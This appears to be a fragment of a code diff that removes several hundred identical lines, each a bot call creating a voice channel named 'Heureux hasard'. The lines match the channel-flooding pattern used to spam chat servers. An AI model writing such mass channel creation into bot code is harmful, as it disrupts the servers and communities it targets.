-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
